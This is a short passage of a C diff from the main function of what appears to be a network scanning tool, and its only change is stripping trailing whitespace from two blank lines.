             run_scan(&args, 0, args.targets.count);
             return 0;
-            
+
         case Op_Offline:
             if (args.offline_filename == 0) {
                 ERROR_MSG("[-] must specify file to read from\n");
@@ -2590,6 +2590,6 @@ main(int argc, char *argv[])
         fclose(args.fp);
         args.fp = NULL;
     }
-    
+
     return 0;
 }
